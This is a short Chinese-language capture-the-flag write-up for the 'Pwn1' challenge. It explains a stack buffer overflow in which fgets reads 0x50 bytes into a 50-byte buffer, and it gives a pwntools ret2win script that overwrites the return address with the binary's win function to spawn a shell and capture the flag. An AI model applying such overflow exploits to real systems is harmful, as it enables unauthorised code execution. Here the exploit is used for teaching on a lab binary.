# Pwn1

## 题目简述

程序为输入分配 50 字节栈缓冲区，却调用 `fgets(input, 0x50, stdin)`，可以覆盖返回地址；二进制还保留了直接启动 shell 的 `win` 函数。

## 解题过程

通过 cyclic pattern 或调试确认从缓冲区起始到返回地址的偏移为 72 字节。覆盖返回地址为 `win`：

```python
from pwn import *

elf = context.binary = ELF("./pwn1")
io = process(elf.path)
io.sendline(b"A" * 72 + p64(elf.symbols.win))
io.interactive()
```

`win` 调用 `system("/bin/sh")`，进入 shell 后得到：

```text
n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}
```

## 方法总结

这是标准 ret2win：确认保护与偏移后，直接复用二进制中的目标函数。源码变量大小不能替代实际栈布局，偏移应由运行时模式验证。
